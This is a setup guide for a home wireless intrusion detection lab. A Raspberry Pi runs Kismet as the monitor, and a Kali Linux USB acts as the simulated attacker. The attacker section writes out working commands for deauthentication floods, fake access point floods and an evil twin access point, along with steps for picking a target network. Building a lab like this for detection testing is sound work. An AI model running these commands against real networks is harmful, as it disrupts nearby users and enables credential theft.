# 🛠️ WIDRS Setup Guide

This guide explains how to set up a Wireless Intrusion Detection and Response System (WIDRS) using:

1. **Raspberry Pi** — as the wireless intrusion detection system  
2. **Kali Linux Live USB** — as the attacker device to simulate wireless threats

---

## 🛰️ 1. Raspberry Pi Setup (Monitoring Device)

### 🔧 Steps

#### 1. Flash Kali Linux to SD Card
- Download the Kali ARM image from [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
- Flash the image to an SD card using **Raspberry Pi Imager** or **Balena Etcher**
- Insert the SD card into the Raspberry Pi and boot

#### 2. Update System
```bash
sudo apt update && sudo apt upgrade
```

#### 3. Install Tools
```bash
sudo apt install kismet aircrack-ng
```

#### 4. Enable Monitor Mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig
```
- Confirm that `wlan0mon` appears and is active

#### 5. Start Kismet
```bash
sudo kismet
```

#### 6. Access Dashboard
- Open a browser and navigate to: `http://localhost:2501`
- View real-time alerts in the **Alerts** tab

---

## ⚔️ 2. Kali Linux Live USB Setup (Attacker Device)

### 🔧 Steps

#### 1. Flash Kali to USB
- Download the Kali ISO from [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
- Flash the ISO to a USB drive using **Rufus** (Windows) or `dd` (Linux/macOS)

#### 2. Boot from USB
- Enter the BIOS/UEFI setup
- Set the USB as the first boot option
- Boot into **Kali Live Mode**

#### 3. Enable Monitor Mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

#### 4. Scan for Nearby Networks
```bash
airodump-ng wlan0mon
```
- Identify your target network’s:
  - **BSSID** (MAC address)
  - **Channel number**

#### 5. Lock Adapter to Target’s Channel
```bash
sudo iwconfig wlan0mon channel <channel_number>
```

---

## 💣 Launch Simulated Attacks

#### 🚫 Deauthentication Flood
```bash
mdk4 wlan0mon d
```

#### 🌀 Fake Access Point Flood
```bash
mdk4 wlan0mon a
```

#### 🎭 Evil Twin Access Point
```bash
airbase-ng -e "TargetSSID" -c <channel_number> wlan0mon
```

---

## ✅ Detection via Kismet
Kismet on the Raspberry Pi should detect:
- **DEAUTH/FLOOD** — Deauthentication spam
- **EVILTWIN / SPOOF** — Rogue APs mimicking SSIDs
- **FORMATSTRING** — Excessive AP spam or malformed packets

⚠️ **Note**: Ensure both devices are operating on the same Wi-Fi channel for effective detection.